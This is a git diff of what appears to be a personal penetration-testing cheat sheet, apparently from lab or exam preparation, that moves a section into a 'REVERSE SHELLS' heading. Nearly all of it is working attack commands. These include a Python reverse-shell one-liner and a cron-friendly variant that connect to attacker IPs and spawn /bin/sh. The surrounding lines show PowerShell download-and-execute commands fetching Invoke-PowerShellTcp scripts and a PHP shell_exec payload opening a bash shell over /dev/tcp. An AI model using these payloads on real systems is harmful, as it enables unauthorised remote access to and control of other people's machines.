@@ -307,13 +307,6 @@ powershell -c iex (New-Object System.Net.Webclient).DownloadString('http://192.1
 powershell -c iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp8888.ps1')
 
 ````
-##### THE ONELINER PYTHON ***GOLDEN***
-```bash
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.226",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-***NOTE: I have gotten the follwing little script to run if its a python cron.
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.66",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
-````
 ##### SysNative 32bit to 64
 ````
 cd C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
@@ -333,6 +326,13 @@ if you happen to get unto an ancient windows machine that needs to execute 32 bi
 ```
 
 # REVERSE SHELLS
+### THE ONELINER PYTHON ***GOLDEN***
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.226",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+***NOTE: I have gotten the follwing little script to run if its a python cron.
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.66",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+````
 ```bash
 PHP 
 <?php $cmd = shell_exec('bash -i >& /dev/tcp/192.168.119.155/4444 0>&1'); echo $cmd;?> 
